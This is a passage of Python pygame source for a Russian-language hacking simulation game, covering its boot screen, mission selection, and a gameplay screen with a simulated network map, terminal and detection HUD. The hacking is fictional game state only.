        if event.type == pygame.KEYDOWN and (event.key in (pygame.K_RETURN, pygame.K_SPACE)):
            self.done = True

    def update(self, dt):
        self.pulse += dt * 2.5
        self.rain_t += dt
        if self.rain_t > 0.07:
            self.rain_t = 0
            for i in range(len(self.rain)):
                if random.random() < 0.07:
                    self.rain[i] = (random.randint(0,SW), random.randint(0,SH),
                                    chr(random.randint(0x30A0,0x30FF)), random.randint(15,80))
        if self.line_i >= len(self.BOOT_LINES):
            self.timer += dt
            if self.timer > 1.2: self.done = True
            return
        self.timer += dt
        _, delay = self.BOOT_LINES[self.line_i]
        if self.timer > delay:
            self.timer = 0
            text, _ = self.BOOT_LINES[self.line_i]
            if self.char_i < len(text):
                self.cur_line += text[self.char_i]
                self.char_i += 1
            else:
                self.typed.append(self.cur_line)
                self.cur_line = ""
                self.char_i   = 0
                self.line_i  += 1
                self.timer    = 0

    def draw(self):
        self.surf.fill((2, 4, 10))
        tiny = fnt("consolas", 10, False)
        for x, y, ch, a in self.rain:
            s = tiny.render(ch, True, (0, a, 0))
            self.surf.blit(s, (x, y))
        overlay = pygame.Surface((SW, SH), pygame.SRCALPHA)
        overlay.fill((2, 4, 10, 140))
        self.surf.blit(overlay, (0, 0))

        # Logo
        logo_y = 40
        pulse_a = int(128 + 127*math.sin(self.pulse))
        for i, line in enumerate(self.ASCII_LOGO):
            col = (0, min(255, pulse_a + i*10), min(180, 60+i*10))
            s   = self.f_logo.render(line, True, col)
            self.surf.blit(s, ((SW - s.get_width())//2, logo_y + i*14))

        subtitle_y = logo_y + len(self.ASCII_LOGO)*14 + 10
        txt(self.surf, "CYBER OPS  v2.0  —  КИБЕРБЕЗОПАСНОСТЬ С ИИ", self.f_boot, C_CYAN, SW//2, subtitle_y, center=True)
        txt(self.surf, "Гелич К.А.  |  КЕМ-25-01  |  РГУ нефти и газа (НИУ) им. И.М. Губкина",
            fnt("consolas",12), C_GRAY, SW//2, subtitle_y+22, center=True)

        # Boot log
        log_y = subtitle_y + 55
        for i, line in enumerate(self.typed[-14:]):
            col = C_GREEN if i == len(self.typed)-1 else C_GRAY
            txt(self.surf, f"[OK]  {line}", self.f_boot, col, 80, log_y + i*20)
        if self.cur_line:
            blink = "_" if int(time.time()*4)%2 else ""
            txt(self.surf, f"[..] {self.cur_line}{blink}", self.f_boot, C_YELLOW, 80, log_y + len(self.typed)*20)

        if self.line_i >= len(self.BOOT_LINES):
            p = abs(math.sin(self.pulse*0.8))
            col = (int(p*200), int(p*255), int(p*200))
            txt(self.surf, "[ ENTER / SPACE — НАЧАТЬ ]", fnt("consolas",18,True), col, SW//2, SH-60, center=True)
        self.surf.blit(get_crt(), (0,0))

# ════════════════════════════════════════════════════════════════════════════
#  MISSION SELECT SCREEN
# ════════════════════════════════════════════════════════════════════════════
class MissionSelectScreen:
    def __init__(self, surf):
        self.surf   = surf
        self.gm     = GameManager()
        self.hover  = -1
        self.mis    = [("m1","COLD BOOT","CryptoEx Exchange","★","12,000 ₿ + 2 SP",
                         ["Взлом криптобиржи","SQL injection, RCE","Холодный кошелёк: 847 BTC"]),
                       ("m2","PHANTOM SIGNAL","MegaCorp R&D","★★","35,000 ₿ + 3 SP",
                         ["Корпоративный шпионаж","Supply chain, фишинг","Похищение ИИ-модели"]),
                       ("m3","ZERO HOUR","ГосБанк РФ","★★★","100,000 ₿ + 5 SP",
                         ["Банковская операция","SWIFT-мошенничество","$47.5M перевод"])]
        self.f_big   = fnt("consolas", 26, True)
        self.f_med   = fnt("consolas", 16, True)
        self.f_sm    = fnt("consolas", 13, False)
        self.f_xs    = fnt("consolas", 11, False)
        self.skill_btn = _Button(SW-200, SH-60, 180, 44, "🎓 НАВЫКИ ("+str(self.gm.skill_pts)+" SP)",
                                  C_PURPLE, (200,80,255), C_WHITE, 14)
        self.skill_btn.on_click(lambda: self.gm.set_phase(Phase.SKILLS))
        self.rain    = [(random.randint(0,SW), random.randint(0,SH),
                         chr(random.randint(0x30A0,0x30FF)), random.randint(10,50)) for _ in range(100)]
        self.t       = 0.0

    def handle(self, event):
        self.skill_btn.handle(event)
        if event.type == pygame.MOUSEMOTION:
            mx, my = event.pos
            self.hover = -1
            for i in range(len(self.mis)):
                rx = 60 + i*(420+30)
                if rx <= mx <= rx+420 and 180 <= my <= 640:
                    self.hover = i
        if event.type == pygame.MOUSEBUTTONDOWN and event.button==1 and self.hover >= 0:
            mid, *_ = self.mis[self.hover]
            if mid == "m3" and "m2" not in self.gm.completed_m:
                return   # locked
            if mid == "m2" and "m1" not in self.gm.completed_m:
                return   # locked
            self.gm.start_mission(mid)
            NetworkManager().reset(list(self.gm.missions[mid].nodes.keys())[0])

    def update(self, dt):
        self.t += dt
        if int(self.t*8)%8 == 0:
            for i in range(len(self.rain)):
                if random.random() < 0.02:
                    self.rain[i] = (random.randint(0,SW), random.randint(0,SH),
                                    chr(random.randint(0x30A0,0x30FF)), random.randint(10,50))

    def draw(self):
        self.surf.fill(C_BG)
        tiny = fnt("consolas", 9)
        for x, y, ch, a in self.rain:
            s = tiny.render(ch, True, (0, a, 0))
            self.surf.blit(s, (x, y))
        ov = pygame.Surface((SW, SH), pygame.SRCALPHA)
        ov.fill((3,6,14, 180))
        self.surf.blit(ov, (0,0))

        txt(self.surf, "[ GHOST PROTOCOL: CYBER OPS ]", self.f_big, C_GREEN, SW//2, 35, center=True)
        txt(self.surf, "ВЫБОР ОПЕРАЦИИ", fnt("consolas",14), C_GRAY, SW//2, 70, center=True)

        # Stats bar
        panel(self.surf, (20, 98, SW-40, 34), C_PANEL2, C_BORDER)
        txt(self.surf, f"АГЕНТ: GHOST  |  ₿{self.gm.credits:,}  |  SP: {self.gm.skill_pts}  |  ОПЕРАЦИЙ ВЫПОЛНЕНО: {len(self.gm.completed_m)}", fnt("consolas",12), C_CYAN, 40, 109)

        for i, (mid, name, target, diff, reward, bullets) in enumerate(self.mis):
            rx = 60 + i*(420+30)
            locked = (mid=="m2" and "m1" not in self.gm.completed_m) or \
                     (mid=="m3" and "m2" not in self.gm.completed_m)
            done   = mid in self.gm.completed_m
            hovered = self.hover == i

            border_col = C_BORDH if hovered else (C_GREEN if done else (C_DKGRAY if locked else C_BORDER))
            bg_col     = (12,24,12) if done else (C_PANEL if not locked else (8,10,18))
            panel(self.surf, (rx, 145, 420, 490), bg_col, border_col, r=6)

            # Header
            head_col = (30,60,30) if done else (C_PANEL2 if not locked else (10,12,24))
            pygame.draw.rect(self.surf, head_col, (rx, 145, 420, 56), border_radius=6)
            pygame.draw.rect(self.surf, border_col, (rx, 145, 420, 56), 1, border_radius=6)

            nc = C_GRAY if locked else (C_GREEN if done else C_WHITE)
            txt(self.surf, name, self.f_med, nc, rx+20, 154)
            txt(self.surf, diff, fnt("consolas",20,True), C_YELLOW, rx+380, 154)

            if locked: txt(self.surf, "🔒 ЗАБЛОКИРОВАНО", fnt("consolas",12), C_GRAY, rx+20, 178)
            elif done: txt(self.surf, "✓ ВЫПОЛНЕНО", fnt("consolas",12), C_GREEN, rx+20, 178)
            else:      txt(self.surf, f"Цель: {target}", fnt("consolas",12), C_CYAN, rx+20, 178)

            y0 = 215
            txt(self.surf, f"Цель: {target}", self.f_sm, C_CYAN if not locked else C_GRAY, rx+15, y0)
            txt(self.surf, f"Награда: {reward}", self.f_sm, C_YELLOW, rx+15, y0+22)
            pygame.draw.line(self.surf, C_BORDER, (rx+10, y0+44), (rx+400, y0+44), 1)

            for j, b in enumerate(bullets):
                col = C_GRAY if locked else C_WHITE
                txt(self.surf, f"  ▸  {b}", self.f_sm, col, rx+12, y0+56+j*26)

            # Карта сети превью
            m = self.gm.missions[mid]
            ny0 = 400
            for nid2, nd2 in m.nodes.items():
                nx_ = rx + 20 + int(nd2.pos[0]*380)
                ny_ = ny0 + int(nd2.pos[1]*180)
                col = NCOLOR.get(nd2.state.value, (40,50,70)) if not locked else (30,35,50)
                pygame.draw.circle(self.surf, col, (nx_, ny_), 10)
                for conn in nd2.connections:
                    nd2c = m.nodes.get(conn)
                    if nd2c:
                        cx2 = rx + 20 + int(nd2c.pos[0]*380)
                        cy2 = ny0 + int(nd2c.pos[1]*180)
                        pygame.draw.line(self.surf, C_DKGRAY, (nx_, ny_), (cx2, cy2), 1)

            # Hover glow
            if hovered and not locked:
                glow = pygame.Surface((420, 490), pygame.SRCALPHA)
                pygame.draw.rect(glow, (0,180,255,18), (0,0,420,490), border_radius=6)
                self.surf.blit(glow, (rx, 145))
                txt(self.surf, "▶ НАЧАТЬ ОПЕРАЦИЮ", fnt("consolas",13,True), C_GREEN, rx+130, 608)
            if done:
                txt(self.surf, "✓ ПРОЙДЕНО", fnt("consolas",13,True), C_GREEN, rx+145, 608)

        txt(self.surf, "▸ Миссии открываются последовательно", fnt("consolas",11), C_GRAY, 60, 660)
        self.skill_btn.text = f"🎓 НАВЫКИ  ({self.gm.skill_pts} SP)"
        self.skill_btn.draw(self.surf)
        self.surf.blit(get_crt(), (0,0))

# ════════════════════════════════════════════════════════════════════════════
#  BUTTON widget (used by screens above)
# ════════════════════════════════════════════════════════════════════════════
class _Button:
    def __init__(self, x, y, w, h, text, normal, hover, text_col, fs=15, bold=True):
        self.rect     = pygame.Rect(x,y,w,h)
        self.text     = text
        self.normal   = normal
        self.hover    = hover
        self.text_col = text_col
        self.fs       = fs
        self.bold     = bold
        self._hovered = False
        self._cb      = None
    def on_click(self, cb): self._cb = cb; return self
    def handle(self, ev):
        if ev.type == pygame.MOUSEMOTION: self._hovered = self.rect.collidepoint(ev.pos)
        if ev.type == pygame.MOUSEBUTTONDOWN and ev.button==1:
            if self.rect.collidepoint(ev.pos) and self._cb: self._cb()
    def draw(self, surf):
        c = self.hover if self._hovered else self.normal
        pygame.draw.rect(surf, c, self.rect, border_radius=5)
        pygame.draw.rect(surf, C_WHITE, self.rect, 1, border_radius=5)
        f = fnt("consolas", self.fs, self.bold)
        s = f.render(self.text, True, self.text_col)
        surf.blit(s, s.get_rect(center=self.rect.center))

# ════════════════════════════════════════════════════════════════════════════
#  GAMEPLAY SCREEN — главный экран
# ════════════════════════════════════════════════════════════════════════════
class GamePlayScreen:
    def __init__(self, surf):
        self.surf    = surf
        self.gm      = GameManager()
        self.nm      = NetworkManager()
        self.tm      = TerminalManager()
        self.tm.reset()

        m = self.gm.mission()
        # Найти entry node
        entry = next((nid for nid,nd in m.nodes.items() if nd.is_entry), list(m.nodes.keys())[0])
        self.nm.reset(entry)

        # Terminal setup
        self.term_scroll   = 0
        self.TERM_LINES    = (SH - 80) // 17  # видимых строк
        self.f_term        = fnt("consolas", 13, False)
        self.f_sm          = fnt("consolas", 12, False)
        self.f_md          = fnt("consolas", 15, True)
        self.f_hdr         = fnt("consolas", 18, True)

        # Node radii for click detection
        self.NODE_R = 18

        # Selected node info panel
        self.sel_node : Optional[str] = None
        self.selected_vuln_idx = 0

        # Pulse animation
        self.t = 0.0

        # AI sidebar
        self.oracle_panel = []   # list of (text, color)

        # Notif
        self.notif   = ""
        self.notif_t = 0.0

        # Debrief button (hidden until complete/fail)
        self.end_btn = None
        self.mission_state = "active"   # active | complete | failed

        # HUD buttons
        bx = NET_W + TERM_W + 10
        self.btn_cover  = _Button(bx, SH-130, 170, 38, "🧹 COVER TRACKS", C_DKGREEN, C_GREEN, C_WHITE, 12)
        self.btn_cover.on_click(lambda: self.tm.process("cover"))
        self.btn_oracle = _Button(bx+180, SH-130, 170, 38, "💬 ORACLE", (40,15,60), C_PURPLE, C_WHITE, 12)
        self.btn_oracle.on_click(lambda: self.tm.process("oracle"))
        self.btn_escape = _Button(bx, SH-82, 170, 38, "🏠 МЕНЮ", C_DKRED, C_RED, C_WHITE, 12)
        self.btn_escape.on_click(lambda: self.gm.set_phase(Phase.MENU))
        self.btn_skills = _Button(bx+180, SH-82, 170, 38, f"🎓 НАВЫКИ ({self.gm.skill_pts}SP)", C_DKGRAY, C_BLUE, C_WHITE, 11)
        self.btn_skills.on_click(lambda: self.gm.set_phase(Phase.SKILLS))

        EventBus.sub("defcon_change", self._on_defcon)
        EventBus.sub("exfil_done",    self._on_exfil)
        EventBus.sub("exploit_result",self._on_exploit)
        EventBus.sub("mission_complete", self._on_complete)

        # Intro lines
        self.tm.add("╔══════════════════════════════════════════════════════════╗", TC["header"])
        self.tm.add(f"║  {m.codename:<56}║", TC["header"])
        self.tm.add(f"║  Цель: {m.target_org:<52}║", TC["header"])
        self.tm.add("╚══════════════════════════════════════════════════════════╝", TC["header"])
        self.tm.add(f"[*] Подключение установлено: {m.target_org}", TC["info"])
        self.tm.add(f"[*] Начальный узел: {m.nodes[entry].label} ({m.nodes[entry].ip})", TC["info"])
        self.tm.add("[*] Введите 'help' для списка команд", TC["system"])
        self.tm.add("", TC["system"])

        AIManager().oracle(
            f"Начинается операция. Цель: {m.target_org}. Кратко настрой меня.",
            lambda t: self.tm.add(f"[ORACLE] {t}", TC["oracle"]))

    def _on_defcon(self, level):
        col = DEFCON_COL[level]
        trigger_flash(col, 0.35)
        if level >= 2:
            AIManager().sentinel(
                f"DEFCON {level+1} активирован. Угроза обнаружена.",
                lambda t: self.tm.add(f"[SENTINEL] {t}", TC["sentinel"]))

    def _on_exfil(self, nid):
        nd = self.nm.node(nid)
        if nd:
            PS.burst(NET_R.left + int(nd.pos[0]*NET_R.width),
                     int(nd.pos[1]*NET_R.height*0.85)+50, C_GREEN, 60, 5)
            self.tm.add(f"[+] EXFIL ПОДТВЕРЖДЁН: {nd.label}", TC["ok"])

    def _on_exploit(self, data):
        nid, success = data
        nd = self.nm.node(nid)
        if nd:
            col = C_GREEN if success else C_RED
            PS.burst(NET_R.left + int(nd.pos[0]*NET_R.width),
                     int(nd.pos[1]*NET_R.height*0.85)+50, col, 45, 4)

    def _on_complete(self, mid):
        self.mission_state = "complete"
        trigger_flash(C_GREEN, 0.8)
        self.tm.add("", TC["system"])
        self.tm.add("╔══════════════════════════════════╗", TC["ok"])
        self.tm.add("║    MISSION COMPLETE — ОТЛИЧНАЯ   ║", TC["ok"])
        self.tm.add("║    РАБОТА, GHOST!                ║", TC["ok"])
        self.tm.add("╚══════════════════════════════════╝", TC["ok"])
        m = self.gm.mission()
        self.tm.add(f"[+] Получено: ₿{m.reward_cr:,} + {m.reward_sp} SP", TC["ok"])
        AIManager().oracle("Миссия выполнена! Финальное слово хендлера (2 предложения).",
                           lambda t: self.tm.add(f"[ORACLE] {t}", TC["oracle"]))
        self.end_btn = _Button(NET_W+TERM_W//2-120, SH-70, 240, 50,
                                "📋 ДЕБРИФИНГ", C_DKGREEN, C_GREEN, C_WHITE, 16)
        self.end_btn.on_click(lambda: self.gm.set_phase(Phase.DEBRIEF))

    def handle(self, event):
        self.btn_cover.handle(event)
        self.btn_oracle.handle(event)
        self.btn_escape.handle(event)
        self.btn_skills.handle(event)
        if self.end_btn: self.end_btn.handle(event)

        # Клик по узлу сети
        if event.type == pygame.MOUSEBUTTONDOWN and event.button==1:
            mx, my = event.pos
            if NET_R.collidepoint(mx, my):
                m = self.gm.mission()
                for nid, nd in m.nodes.items():
                    nx_ = NET_R.left + int(nd.pos[0]*NET_R.width*0.92) + 20
                    ny_ = 55 + int(nd.pos[1]*(NET_R.height-100))
                    if math.hypot(mx-nx_, my-ny_) < self.NODE_R+4:
                        self.sel_node = nid
                        break

            # Терминал — клик на область ввода (просто фокус)
            if TERM_R.collidepoint(mx, my):
                pass   # всегда в фокусе

        # Прокрутка терминала
        if event.type == pygame.MOUSEWHEEL:
            mx, my = pygame.mouse.get_pos()
            if TERM_R.collidepoint(mx, my):
                self.term_scroll = max(0, self.term_scroll - event.y * 2)

        # Ввод в терминал
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_RETURN:
                cmd = self.tm.input.strip()
                self.tm.input = ""
                if cmd: self.tm.process(cmd)
                self.term_scroll = 0
            elif event.key == pygame.K_BACKSPACE:
                self.tm.input = self.tm.input[:-1]
            elif event.key == pygame.K_UP:
                if self.tm.history:
                    self.tm.hist_i = min(self.tm.hist_i+1, len(self.tm.history)-1)
                    self.tm.input  = self.tm.history[self.tm.hist_i]
            elif event.key == pygame.K_DOWN:
                if self.tm.hist_i > 0:
                    self.tm.hist_i -= 1
                    self.tm.input  = self.tm.history[self.tm.hist_i]
                else:
                    self.tm.hist_i = -1; self.tm.input = ""
            elif event.key == pygame.K_TAB:
                self.tm.autocomplete()
            elif event.key == pygame.K_ESCAPE:
                self.gm.set_phase(Phase.MENU)
            elif len(self.tm.input) < 120 and event.unicode.isprintable():
                self.tm.input += event.unicode

        if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
            self.gm.set_phase(Phase.MENU)

    def update(self, dt):
        self.t += dt
        self.tm.update(dt)
        PS.update(dt)
        if self.notif_t > 0: self.notif_t -= dt

        # Проверка поражения
        if self.gm.detect_rate >= 1.0 and self.mission_state == "active":
            self.mission_state = "failed"
            trigger_flash(C_RED, 1.0)
            self.tm.add("", TC["system"])
            self.tm.add("████████████████████████████████████", TC["err"])
            self.tm.add("   ОБНАРУЖЕН! ОПЕРАЦИЯ ПРОВАЛЕНА    ", TC["err"])
            self.tm.add("████████████████████████████████████", TC["err"])
            AIManager().sentinel("Нарушитель пойман. Все подключения заблокированы.",
                                 lambda t: self.tm.add(f"[SENTINEL] {t}", TC["sentinel"]))
            self.end_btn = _Button(NET_W+TERM_W//2-120, SH-70, 240, 50,
                                    "📋 ДЕБРИФИНГ", C_DKRED, C_RED, C_WHITE, 16)
            self.end_btn.on_click(lambda: self.gm.set_phase(Phase.DEBRIEF))

        # Кнопки
        self.btn_skills.text = f"🎓 НАВЫКИ ({self.gm.skill_pts}SP)"

    def draw(self):
        self.surf.fill(C_BG)
        self._draw_network_panel()
        self._draw_terminal_panel()
        self._draw_hud_panel()
        draw_flash(self.surf, 0)   # dt handled in update
        PS.draw(self.surf)
        self.surf.blit(get_crt(), (0,0))

    # ── NETWORK MAP ──────────────────────────────────────────────────────
    def _draw_network_panel(self):
        panel(self.surf, (NET_R.x, NET_R.y, NET_R.width, NET_R.height), C_PANEL, C_BORDER)
        txt(self.surf, "[ СЕТЬ ]", self.f_sm, C_CYAN, NET_R.x+10, NET_R.y+8)
        m = self.gm.mission()
        if not m: return

        # Рисуем рёбра
        for nid, nd in m.nodes.items():
            nx_ = NET_R.left + int(nd.pos[0]*NET_R.width*0.90) + 18
            ny_ = 55 + int(nd.pos[1]*(NET_R.height-110))
            for conn in nd.connections:
                nd2 = m.nodes.get(conn)
                if nd2:
                    nx2 = NET_R.left + int(nd2.pos[0]*NET_R.width*0.90) + 18
                    ny2 = 55 + int(nd2.pos[1]*(NET_R.height-110))
                    # Яркость линии зависит от состояния
                    both_vis = nd.state != NodeSt.UNKNOWN and nd2.state != NodeSt.UNKNOWN
                    col = C_BORDER if both_vis else C_DKGRAY
                    pygame.draw.line(self.surf, col, (nx_, ny_), (nx2, ny2), 1)

        # Рисуем узлы
        for nid, nd in m.nodes.items():
            nx_ = NET_R.left + int(nd.pos[0]*NET_R.width*0.90) + 18
            ny_ = 55 + int(nd.pos[1]*(NET_R.height-110))
            is_cur = nid == self.nm.current_nid
            is_sel = nid == self.sel_node

            state_key = nd.state.value
            if nd.is_honeypot and nd.state == NodeSt.UNKNOWN:
                state_key = "unknown"
            elif nd.is_honeypot and nd.state != NodeSt.OWNED:
                state_key = "honeypot"
            elif nd.is_objective and nd.state == NodeSt.OWNED:
                state_key = "owned"

            col  = NCOLOR.get(state_key, (40,50,70))
            tcol = NTCOLOR.get(state_key, C_GRAY)

            if nd.state == NodeSt.UNKNOWN:
                pygame.draw.circle(self.surf, col, (nx_, ny_), self.NODE_R)
                txt(self.surf, "?", self.f_sm, tcol, nx_, ny_, center=True)
            else:
                # Пульсация для текущего узла
                if is_cur:
                    pulse_r = int(self.NODE_R + 6 + 4*math.sin(self.t*4))
                    pulse_a = int(80 + 60*math.sin(self.t*4))
                    ps = pygame.Surface((pulse_r*2+4, pulse_r*2+4), pygame.SRCALPHA)
                    pygame.draw.circle(ps, (*col, pulse_a), (pulse_r+2,pulse_r+2), pulse_r, 2)
                    self.surf.blit(ps, (nx_-pulse_r-2, ny_-pulse_r-2))

                # Objective glow
                if nd.is_objective and nd.state != NodeSt.OWNED:
                    for r_glow in range(self.NODE_R+8, self.NODE_R+2, -2):
                        gs = pygame.Surface((r_glow*2,r_glow*2), pygame.SRCALPHA)
                        a_glow = int(30*abs(math.sin(self.t*2)))
                        pygame.draw.circle(gs, (*C_PURPLE, a_glow), (r_glow,r_glow), r_glow)
                        self.surf.blit(gs, (nx_-r_glow, ny_-r_glow))

                pygame.draw.circle(self.surf, col, (nx_, ny_), self.NODE_R)
                pygame.draw.circle(self.surf, tcol, (nx_, ny_), self.NODE_R, 2)
                lbl = nd.label[:6]
                txt(self.surf, lbl, fnt("consolas",9,True), tcol, nx_, ny_, center=True)

                if nd.backdoor:
                    txt(self.surf, "⚡", fnt("consolas",9), C_YELLOW, nx_+self.NODE_R-4, ny_-self.NODE_R)

            if is_sel:
                pygame.draw.circle(self.surf, C_BORDH, (nx_, ny_), self.NODE_R+3, 2)

        # Selected node info
        if self.sel_node:
            nd = m.nodes.get(self.sel_node)
            if nd:
                iy = NET_R.height - 210
                panel(self.surf, (NET_R.x+4, iy, NET_R.width-8, 200), C_PANEL2, C_BORDH, r=4)
                scol = NTCOLOR.get(nd.state.value, C_GRAY)
                txt(self.surf, nd.label, fnt("consolas",13,True), scol, NET_R.x+10, iy+6)
                txt(self.surf, nd.ip, fnt("consolas",11), C_GRAY, NET_R.x+10, iy+24)
                txt(self.surf, f"ОС: {nd.os_info[:28]}", fnt("consolas",11), C_GRAY, NET_R.x+10, iy+40)
                txt(self.surf, f"Статус: {nd.state.value.upper()}", fnt("consolas",11), scol, NET_R.x+10, iy+56)
                if nd.is_objective:
                    txt(self.surf, "★ ЦЕЛЬ ОПЕРАЦИИ", fnt("consolas",11,True), C_PURPLE, NET_R.x+10, iy+72)
                if nd.is_honeypot and nd.state in (NodeSt.SCANNED, NodeSt.OWNED):
                    txt(self.surf, "☠ HONEYPOT!", fnt("consolas",11,True), C_RED, NET_R.x+10, iy+72)
                if nd.vulns and nd.state != NodeSt.UNKNOWN:
                    txt(self.surf, "Уязвимости:", fnt("consolas",11,True), C_YELLOW, NET_R.x+10, iy+90)
                    for ji, v in enumerate(nd.vulns[:3]):
                        txt(self.surf, f"  [{v.vid}] {v.name[:24]}", fnt("consolas",10), C_YELLOW, NET_R.x+10, iy+106+ji*16)
                if nd.files and nd.state == NodeSt.OWNED:
                    txt(self.surf, f"Файлов: {len(nd.files)}  Скачано: {len(nd.downloaded)}", fnt("consolas",11), C_CYAN, NET_R.x+10, iy+160)
                # Pivot button
                if self.sel_node != self.nm.current_nid:
                    is_adj = self.sel_node in m.nodes.get(self.nm.current_nid,NetNode("","","","",(.5,.5),[],[],{})).connections
                    if is_adj:
                        txt(self.surf, "[ ЛКМ × 2 → pivot ]", fnt("consolas",10), C_GREEN, NET_R.x+10, iy+178)

    # ── TERMINAL ─────────────────────────────────────────────────────────
    def _draw_terminal_panel(self):
        panel(self.surf, (TERM_R.x, TERM_R.y, TERM_R.width, TERM_R.height), C_PANEL, C_BORDER)
        # Header
        pygame.draw.rect(self.surf, C_PANEL2, (TERM_R.x, 0, TERM_R.width, 36))
        pygame.draw.line(self.surf, C_BORDER, (TERM_R.x, 36), (TERM_R.x+TERM_R.width, 36), 1)
        m = self.gm.mission()
        txt(self.surf, f"TERMINAL  //  {m.codename}  //  ghost@{self.nm.current_nid}",
            fnt("consolas",12), C_CYAN, TERM_R.x+12, 11)

        # Dot indicators
        for i, c in enumerate([C_RED, C_YELLOW, C_GREEN]):
            pygame.draw.circle(self.surf, c, (TERM_R.right-18-i*18, 18), 6)

        # Output area
        visible_lines = self.tm.lines
        n_vis  = self.TERM_LINES
        start  = max(0, len(visible_lines) - n_vis - self.term_scroll)
        end    = max(0, len(visible_lines) - self.term_scroll)
        y0     = 44
        for i, (line, col) in enumerate(visible_lines[start:end]):
            txt(self.surf, line[:86], self.f_term, col, TERM_R.x+10, y0 + i*17)

        # Input line
        pygame.draw.rect(self.surf, (6,12,24), (TERM_R.x, SH-46, TERM_R.width, 46))
        pygame.draw.line(self.surf, C_BORDER, (TERM_R.x, SH-46), (TERM_R.x+TERM_R.width, SH-46), 1)
        if self.end_btn:
            self.end_btn.draw(self.surf)
        else:
            prompt_w = txt(self.surf, self.tm.prompt(), self.f_term, C_DKGREEN, TERM_R.x+10, SH-30)
            blink = "_" if int(self.t*2.5)%2 else " "
            txt(self.surf, self.tm.input + blink, self.f_term, C_GREEN, TERM_R.x+10+prompt_w+2, SH-30)

        # Scroll indicator
        if self.term_scroll > 0:
            txt(self.surf, f"↑ {self.term_scroll} строк выше", fnt("consolas",10), C_GRAY, TERM_R.right-150, SH-48)

    # ── HUD ──────────────────────────────────────────────────────────────
    def _draw_hud_panel(self):
        hx, hy, hw, hh = HUD_R.x, 0, HUD_R.width, SH
        panel(self.surf, (hx, hy, hw, hh), C_PANEL, C_BORDER)

        # DEFCON display
        dc   = self.gm.defcon
        dcol = DEFCON_COL[dc]
        panel(self.surf, (hx+8, 8, hw-16, 80), C_PANEL2, dcol, r=4)
        pulse_a = abs(math.sin(self.t*(2+dc))) if dc >= 3 else 1.0
        dc_col2 = tuple(int(c*pulse_a) for c in dcol)
        txt(self.surf, DEFCON_NAME[dc], fnt("consolas",22,True), dc_col2, hx+hw//2, 32, center=True)
        txt(self.surf, DEFCON_MSG[dc], fnt("consolas",11), dcol, hx+hw//2, 56, center=True)

        # Detection bar
        txt(self.surf, "ОБНАРУЖЕНИЕ", fnt("consolas",11), C_GRAY, hx+12, 98)
        dr = self.gm.detect_rate
        bar_col = DEFCON_COL[dc]
        hbar(self.surf, hx+12, 114, hw-24, 14, dr, bar_col)
        txt(self.surf, f"{dr*100:.1f}%", fnt("consolas",11,True), bar_col, hx+hw-12, 98, right=True)

        # Stealth
        stealth = min(0.5, sum(s.stealth_bonus for s in self.gm.skills if s.unlocked))
        txt(self.surf, "СОКРЫТИЕ", fnt("consolas",11), C_GRAY, hx+12, 136)
        hbar(self.surf, hx+12, 152, hw-24, 14, stealth*2, C_CYAN)
        txt(self.surf, f"{stealth*100:.0f}%", fnt("consolas",11,True), C_CYAN, hx+hw-12, 136, right=True)

        # Credits
        txt(self.surf, f"₿  {self.gm.credits:,}", fnt("consolas",16,True), C_YELLOW, hx+12, 176)
        txt(self.surf, f"SP {self.gm.skill_pts}", fnt("consolas",13,True), C_PURPLE, hx+hw-12, 180, right=True)

        # Divider
        pygame.draw.line(self.surf, C_BORDER, (hx+8, 200), (hx+hw-8, 200), 1)

        # Objectives
        txt(self.surf, "ЦЕЛИ ОПЕРАЦИИ", fnt("consolas",12,True), C_CYAN, hx+12, 208)
        m  = self.gm.mission()
        oy = 228
        for obj in m.objectives:
            sym = "✓" if obj.done else "○"
            col = TC["ok"] if obj.done else C_GRAY
            for line in wrap(f"{sym} {obj.text}", 34):
                txt(self.surf, line, fnt("consolas",11), col, hx+12, oy)
                oy += 16
            oy += 3

        # Divider
        pygame.draw.line(self.surf, C_BORDER, (hx+8, oy+4), (hx+hw-8, oy+4), 1)
        oy += 12

        # Current node details
        cur = self.nm.current()
        if cur:
            txt(self.surf, "ТЕКУЩИЙ УЗЕЛ", fnt("consolas",11,True), C_CYAN, hx+12, oy)
            oy += 18
            state_col = NTCOLOR.get(cur.state.value, C_GRAY)
            txt(self.surf, cur.label, fnt("consolas",13,True), state_col, hx+12, oy)
            oy += 18
            txt(self.surf, cur.ip, fnt("consolas",11), C_GRAY, hx+12, oy); oy+=16
            txt(self.surf, cur.os_info[:28], fnt("consolas",10), C_GRAY, hx+12, oy); oy+=16
            txt(self.surf, f"Статус: {cur.state.value.upper()}", fnt("consolas",11,True), state_col, hx+12, oy); oy+=20
            if cur.vulns and cur.state in (NodeSt.SCANNED, NodeSt.ACCESSIBLE, NodeSt.OWNED):
                txt(self.surf, "Уязвимости:", fnt("consolas",10,True), C_YELLOW, hx+12, oy); oy+=14
                for v in cur.vulns[:3]:
                    txt(self.surf, f"  [{v.vid}] {v.name[:20]}", fnt("consolas",10), C_YELLOW, hx+12, oy); oy+=14
            if cur.state == NodeSt.OWNED and cur.files:
                txt(self.surf, f"Файлов: {len(cur.files)}  ↓{len(cur.downloaded)}", fnt("consolas",10), C_CYAN, hx+12, oy); oy+=16

        pygame.draw.line(self.surf, C_BORDER, (hx+8, SH-150), (hx+hw-8, SH-150), 1)

        # Action buttons
        self.btn_cover.draw(self.surf)
        self.btn_oracle.draw(self.surf)
        self.btn_escape.draw(self.surf)
        self.btn_skills.draw(self.surf)

        # Mission state banner
        if self.mission_state == "complete":
            panel(self.surf, (hx+8, SH-195, hw-16, 38), (5,30,10), C_GREEN, r=4)
            txt(self.surf, "✓ MISSION COMPLETE", fnt("consolas",13,True), C_GREEN, hx+hw//2, SH-178, center=True)
        elif self.mission_state == "failed":
            panel(self.surf, (hx+8, SH-195, hw-16, 38), (30,5,8), C_RED, r=4)
            txt(self.surf, "✗ MISSION FAILED", fnt("consolas",13,True), C_RED, hx+hw//2, SH-178, center=True)

# ════════════════════════════════════════════════════════════════════════════
#  SKILL TREE SCREEN
# ════════════════════════════════════════════════════════════════════════════
class SkillTreeScreen:
    def __init__(self, surf):
        self.surf    = surf
        self.gm      = GameManager()
        self.sm      = SkillManager()
        self.hover   : Optional[str] = None
        self.sel     : Optional[str] = None
        self.notif   = ""
        self.notif_t = 0.0
        self.t       = 0.0
        self.back_btn = _Button(SW//2-100, SH-60, 200, 44, "← НАЗАД", C_DKGRAY, C_BORDER, C_WHITE, 14)
